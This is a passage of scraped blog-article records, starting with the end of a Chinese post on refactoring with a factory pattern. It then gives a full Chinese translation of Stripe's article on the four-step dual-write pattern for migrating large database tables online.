</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-22\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-23\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-24\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-25\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-26\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-27\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"apple\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">PeelOff </span><span class=\"crayon-v\">peelOff</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">PeelOffFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getPeelOff</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">type</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">//get ApplePeelOff Class Instance.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc8be0f6353697782-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">peelOff</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pealOff</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc8be0f6353697782-31\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0035 seconds] -->\r\n<p>上面这种实现方式使得别人无法修改我们的代码，为什么？</p>\n<p>因为当需要对西瓜剥皮的时候，他会发现他只能新增一个类实现 PeelOff 接口，而无法再原来的代码上修改。这样就实现了「对拓展开放，对修改封闭」的原则。</p>\n<p>其实上面这种设计模式是最基本的设计模式：抽象设计模式。对于各种复杂的业务情形，还有其他许多设计模式，例如：代理模式、装饰模式等等。但各种模式归根到底还是考察你对业务的理解能力以及抽象能力，如果你对业务足够理解，你即使不知道某个设计模式，你也会写着写着写出这样一个设计模式。</p>\n<h2 id=\"总结\">总结</h2>\n<p>此时重构的经历让我觉得十分痛苦，但熬过来了就觉得没什么了。忽然感叹道重构还是很有技巧性的，对于技术要求反而没有那么高。重构更多考验的是对业务的深入理解，对抽象思维的进一步运用。如果业务理解深入，有抽象的思维，那设计模式还可以一点点学出来。而如果反过来，则没有办法做下去。</p>\n<p>重构何其苦，且做且前行。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113355\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113355votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113355\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/b814d46e0e4369d6fba5adf938c13795fd668c05.jpg"}
{"url_object_id": "6430b256b627356fe28c427fcd33ae0e", "title": "数据库 schema 迁移数据最佳实践", "url": "http://blog.jobbole.com/113079/", "create_date": "2017/11/27", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/02/d96d4345a7d19d365cae211b5a3b2bbd.png"], "praise_nums": 2, "comment_nums": 0, "favor_nums": 1, "tags": "IT技术,数据库,数据迁移", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/techzi\">followflows</a> 翻译，<a href=\"http://www.jobbole.com/members/huanglimin\">黄利民</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://stripe.com/blog/online-migrations\">Stripe / Jacqueline Xu</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><div>\n<h3>如何进行大规模在线数据迁移</h3>\n<p>工程团队常面临一项共同挑战：重新设计数据模型以支持清晰准确的抽象和更复杂的功能。这意味着，在生产环境中，需要迁移数以百万计的活跃数据对象，并且重构上千行代码。</p>\n<p>用户期望 Stripe API 保障可用性和一致性。所以在进行迁移时，需要格外谨慎，必须保证数据的数值正确无误，并且 Stripe 的服务始终保持可用。</p>\n<p>本文将展示国外移动支付服务商 Stripe 如何安全地对数以亿计的 Subscriptions（订阅服务）对象进行大规模迁移。</p>\n<h3>为什么迁移困难？</h3>\n<p><span style=\"color: #800000;\"><strong>1.数据规模</strong></span></p>\n<p>数以亿计的 Subscriptions 对象。在生产环境数据库上进行涉及到所有这些对象的大规模迁移会有巨大的工作量。</p>\n<p>想象一下，迁移一个 Subscription 对象需要花费一秒钟，若以顺序方式迁移一亿个对象将花费超过三年的时间。</p>\n<p><strong><span style=\"color: #800000;\">2.服务运行时间</span></strong></p>\n<p>商业机构持续通过 Stripe 的服务进行交易。所有的基础设施升级都是在线进行，而不依赖于有计划的维护时段。因为不能在迁移过程中中断 Subscriptions 服务，在这个迁移过程中必须要保证所有服务 100% 处于可用状态。</p>\n<p><strong><span style=\"color: #800000;\">3.数据正确性</span></strong></p>\n<p>代码库中的很多代码都在使用 Subscriptions 数据库表。如果试图一次性修改整个 Subscriptions 服务中数以千计的代码行，那几乎肯定会忽视一些边界情况 。工程团队必须确保每项服务都能够持续获取正确无误的数据。</p>\n<h3>在线迁移的模式</h3>\n<p>将数百万个对象从旧数据库表迁移到新表是很有难度的，但许多公司需要去做这样的事情。</p>\n<p>以下是在进行大型在线迁移中常用的 4 步”双写模式“，具体步骤是：</p>\n<ol>\n<li>向旧表和新表<strong>双写</strong>数据以保证它们之间的数据是同步的。</li>\n<li><strong>修改</strong>代码库中<strong>所有的数据读取路径</strong>以从新表读取数据。</li>\n<li><strong>修改</strong>代码库中<strong>所有的数据写入路径</strong>以将数据只写入新表。</li>\n<li><strong>删除</strong>依赖过时数据模型的<strong>旧数据</strong>。</li>\n</ol>\n<h3>迁移示例：Subscriptions</h3>\n<p><strong>什么是Subscriptions？为什么需要进行数据迁移？</strong></p>\n<p>Stripe 的 Subscriptions 用于帮助 DigitalOcean 和 Squarespace 这类用户构建并管理他们客户的循环计费。在过去几年中，我们稳步增加了一些功能来支持更复杂的计费模式，例如多订阅、试用、优惠券和发票。</p>\n<p>在早期，每个 Customer 对象最多只有一个 subscription 。 customers 信息存储为单独的记录。因为 customers 到 subscriptions 之间的映射关系非常简单，所以subscriptions 信息与 customers 信息存储在一起。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc6d4ba5016360401\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass Customer\r\n  Subscription subscription\r\nend</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc6d4ba5016360401-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc6d4ba5016360401-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc6d4ba5016360401-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc6d4ba5016360401-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Customer</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc6d4ba5016360401-2\"><span class=\"crayon-e\">  </span><span class=\"crayon-e\">Subscription </span><span class=\"crayon-e\">subscription</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc6d4ba5016360401-3\"><span class=\"crayon-st\">end</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>最终，我们的用户想要具有多个 subscriptions 的 customers 。我们决定将单一的 <code>subscription</code> 字段转换为 <code>subscriptions</code> 字段，以便存储具有多个 subscription 的数组。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc6d4bae955599436\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass Customer\r\n  array: Subscription subscriptions\r\nend</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc6d4bae955599436-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc6d4bae955599436-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc6d4bae955599436-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc6d4bae955599436-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Customer</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc6d4bae955599436-2\"><span class=\"crayon-e\">  </span><span class=\"crayon-t\">array</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Subscription </span><span class=\"crayon-e\">subscriptions</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc6d4bae955599436-3\"><span class=\"crayon-st\">end</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>当添加新功能时，这个数据模型便出现问题了。任何对 subscriptions 的修改都会引发整条 Customer 记录的更新，以及 subscriptions 相关的查询都要通过扫描 customer 对象实现。所以我们决定将 subscriptions 独立存储。<a href=\"http://jbcdn2.b0.upaiyun.com/2017/02/d96d4345a7d19d365cae211b5a3b2bbd.png\"><img class=\"alignnone size-full wp-image-66700 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/d96d4345a7d19d365cae211b5a3b2bbd.png\" alt=\"1\" width=\"1242\" height=\"558\"></a></p>\n<p style=\"text-align: center;\">（重新设计的数据模型将 subscriptions 转移到独立的数据表中）</p>\n<p>提醒一下，四步迁移方案如下：</p>\n<ol>\n<li>向旧表和新表<strong>双写</strong>数据以保证它们之间的数据是同步的。</li>\n<li><strong>修改</strong>代码库中<strong>所有的数据读取路径</strong>以从新表读取数据。</li>\n<li><strong>修改</strong>代码库中<strong>所有的数据写入路径</strong>以将数据只写入新表。</li>\n<li><strong>删除</strong>依赖过时数据模型的<strong>旧数据</strong>。</li>\n</ol>\n<p>下面介绍这四个步骤的具体实践。</p>\n<h3>第一步：双写</h3>\n<p>创建一张新的数据库表，作为迁移的开始。第一步是开始复制新数据，同时写入新旧两处存储中。之后，再将缺失的数据回填至新存储，已使两处存储具有相同的数据<img class=\"alignnone size-full wp-image-66699 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/0ffdad5918be6e390805ce6dad6350fb.png\" alt=\"2\" width=\"1208\" height=\"762\"></p>\n<p style=\"text-align: center;\">（所有新写入的数据都应更新新旧两处存储）</p>\n<p>在 Stripe 的案例中，我们将所有新创建的 subscriptions 同时写入 Customers 表和 Subscriptions 表。在开始双写两张表之前，需要评估额外的写入操作对生产环境数据库性能的潜在影响。可以通过缓慢提高重复对象的百分比来缓解性能问题，同时持续关注系统运行指标。</p>\n<p>进行到此时，新创建的对象已同时存在于两张表中，而旧对象只能在旧表中找到。接下来将以懒惰方式（ lazy fashion ）开始复制已存在的旧对象：每当对象更新时，将它们自动复制到新表中。这种方式可逐步转移已存在的数据。</p>\n<p>最后，将剩余的 subscriptions 数据回填至新表。<img class=\"alignnone size-full wp-image-66698 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/72a45bd2261a40cdfe87f094f4be39c5.png\" alt=\"3\" width=\"1116\" height=\"546\"></p>\n<p style=\"text-align: center;\">（回填已存在 subscriptions 数据至新表）</p>\n<p>在正在对外提供服务的数据库上找到所有需要迁移的数据是回填操作中代价最大的部分。通过查询数据库查找所有对象的方式将需要在生产环境数据库上执行相当多的查询操作，这将耗费很多时间。幸运的是，可以将数据从线上导入对生产环境数据库完全无影响的离线流程中。我们创建适用于我们 Hadoop 集群的数据库快照，这让我们可以使用 MapReduce 以离线、分布式的方式快速处理数据。</p>\n<p>我们使用 <a href=\"https://github.com/twitter/scalding\">Scalding</a> 来管理 MapReduce 作业。 Scalding 是用 Scala 编写的非常实用的库，可以很容易地编写MapReduce作业（10行代码即可实现一个简单的作业）。 在这种情况下，使用 Scalding 帮助工程团队找出所有subscriptions 数据。具体步骤如下：</p>\n<ul>\n<li>编写一份 Scalding 作业，提供所有需要复制的 subscription ID 的列表。</li>\n<li>通过一组进程并行执行来大规模的复制 subscriptions 数据。</li>\n<li>迁移完成后，需再次运行 Scalding 作业，以确保所有 subscriptions 数据都已存在于 Subscriptions 表中。</li>\n</ul>\n<h3>第二步：改变所有读操作路径</h3>\n<p>到目前为止，新旧数据表已是同步状态。下一步要做的是在新表上进行所有的<strong>读操作</strong>。</p>\n<p><img class=\"alignnone size-full wp-image-66697 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/e9910cfeee56ea7a9c8e053ccf5d1131.png\" alt=\"4\" width=\"1132\" height=\"760\"></p>\n<p style=\"text-align: center;\">（目前，所有的读操作在 Customers 表上进行，需要将这些操作转移到 Subscriptions 表上）</p>\n<p>需要确保从新表读数据是安全的，subscription 在新旧表中的数据应该是一致的。可以使用 GitHub 出品的 <a href=\"https://github.com/github/scientist\">Scientist</a> 来辅助验证读操作。Scientist 是一个 Ruby 库， 它可以让我们在生产环境运行实验，比对不同代码的运行结果并对不一致的结果发出警告 。通过 Scientist ，可实时生成针对不一致结果的警告和指标。当实验代码中发生错误，其余的应用程序是不会受到任何影响的。</p>\n<p>实验按如下进行：</p>\n<ul>\n<li>使用 Scientist 从 Subscriptions 表和 Customers 表同时读取数据。</li>\n<li>如果读取到的数据不一致，则向工程团队发出警告。</li>\n</ul>\n<p><img class=\"alignnone size-full wp-image-66696\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/6bb7a2fcc138d877f51dcdfaf6d6db6a.png\" alt=\"5\" width=\"1112\" height=\"748\"></p>\n<p>GitHub 的 Scientist 可运行读取两张表并对数据做对比的实验。</p>\n<p>在确认所有数据是一致的后，就可以开始从新表读取数据了。</p>\n<p><img class=\"alignnone size-full wp-image-66695 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/17099cdcb33daad209428d8344cbafd4.png\" alt=\"6\" width=\"1078\" height=\"754\"></p>\n<p style=\"text-align: center;\">（实验成功，现在所有的读操作都在 Subscriptions 表上进行）</p>\n<h3>第三步：改变所有写操作路径</h3>\n<p>接下来，需要更新写操作路径，将数据写入新的 Subscriptions 表。 实施的目标是逐步推进这些改变，所以需要采取谨慎的策略。</p>\n<p>直到现在，数据一直写入旧表，然后被复制到新表： <img src=\"Online%20migrations%20at%20scale/Online%20migrations%20at%20scale/D2FA77C3-5191-4E29-AEA2-20991ABB4E63.png\" alt=\"\"></p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/02/a2b05d62e7841292760084c23aac9e4a.png\"><img class=\"alignnone size-full wp-image-66694\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/a2b05d62e7841292760084c23aac9e4a.png\" alt=\"7\" width=\"1084\" height=\"192\"></a></p>\n<p>现在要颠倒这个顺序：先将数据写入新表，然后将其写入旧表中。 通过保持这两张表的一致性，我们可以进行增量更新并仔细观察每个更改。</p>\n<p>重构 subscriptions 的所有写操作代码可以说是迁移中最具挑战性的部分。 Stripe 服务中处理 subscriptions 操作的逻辑（例如更新，分期付款、续费）涉及多个服务的数千行代码。</p>\n<p>成功重构的关键是增量处理：将尽可能多的代码路径分隔成可能的最小单元，以便可以仔细应用每个更改。 新旧两张表的数据在重构的任何一个阶段都需要保持一致。</p>\n<p>对于每个代码路径，我们需要使用整体方法来确保我们的更改是安全的。 我们不能仅仅只使用新数据替代旧数据：每一个逻辑块都需要仔细斟酌。 如果错过了任何情况，可能就会造成数据不一致。 值得庆幸的是，可以运行更多的 Scientist 实验来提醒工程团队可能存在的任何不一致。</p>\n<p>新的，简化的写数据路径如下所示：</p>\n<p><img src=\"Online%20migrations%20at%20scale/Online%20migrations%20at%20scale/8BF3A8D4-87E1-4B0A-855F-8F57013DEAD0.png\" alt=\"\"><img class=\"alignnone size-full wp-image-66693\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/ab6b90bb293896da06cc1b9013b8cc42.png\" alt=\"8\" width=\"1062\" height=\"188\"></p>\n<p>可通过在调用 subscriptions 数组时触发报错的方法，确保没有代码继续使用过时的subscriptions 数组：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc6d4bb7083015351\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass Customer\r\n  def subscriptions\r\n    hard_assertion_failed(\"Accessing subscriptions array on customer\")\r\n  end\r\nend</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc6d4bb7083015351-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc6d4bb7083015351-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc6d4bb7083015351-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc6d4bb7083015351-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc6d4bb7083015351-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc6d4bb7083015351-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Customer</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc6d4bb7083015351-2\"><span class=\"crayon-e\">  </span><span class=\"crayon-e\">def </span><span class=\"crayon-e\">subscriptions</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc6d4bb7083015351-3\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">hard_assertion_failed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Accessing subscriptions array on customer\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc6d4bb7083015351-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-st\">end</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc6d4bb7083015351-5\"><span class=\"crayon-st\">end</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3>第四步：删除旧数据</h3>\n<p>最后的（也是最令人满意的）步骤是移除旧的写操作代码，并最终删除。</p>\n<p>一旦确定没有任何代码依赖过时数据模型的 subscriptions 字段，就不再需要将数据写入旧表：</p>\n<p><img class=\"alignnone size-full wp-image-66692\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/513d1103d60e8b660c9672ce8b5c91d8.png\" alt=\"9\" width=\"844\" height=\"208\"></p>\n<p>随着这一变化，代码不再使用旧数据源，新数据源成为唯一数据源。</p>\n<p>现在，可以删除所有 Customer 对象上的 subscriptions 数组，并且逐渐以懒惰的方式处理“删除”操作。 每次 subscription 被加载后，都会自动清空这个 subscriptions 数组，然后运行 Scalding 作业并迁移，以查找任何剩余的要删除的对象。 最终的数据模型如下：<br>\n<img class=\"alignnone size-full wp-image-66691\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/9b124af3ac41d6aba90d1f4f5fc50eff.png\" alt=\"10\" width=\"1160\" height=\"468\"></p>\n<h3>结论</h3>\n<p>在保证 Stripe API 数据一致性的同时进行迁移是非常复杂的工作。安全进行这项迁移的几个要点是：</p>\n<ul>\n<li>我们制定了一个四阶段迁移策略，可以让我们在生产环境中不停服进行数据切换。</li>\n<li>使用Hadoop离线处理数据，使用MapReduce以并行方式处理大量数据，而不是依赖在生产环境数据库上执行的代价高昂的查询。</li>\n<li>所做的所有更改都是渐进式的。 我们从未试图一次更改几百行代码。</li>\n<li>所有的变化都是高度透明和可观察的。 Scientist 的实验只要有一条数据在生产环境中是不一致的，就立即提醒工程团队。 在整个迁移过程中，我们都对安全的迁移怀有信心。</li>\n</ul>\n<p>我们发现这种方法在我们执行过的许多在线数据迁移中都很有效。我们希望这些实践做法对于其他团队进行大规模迁移也是有帮助的。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113079\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113079votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113079\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a 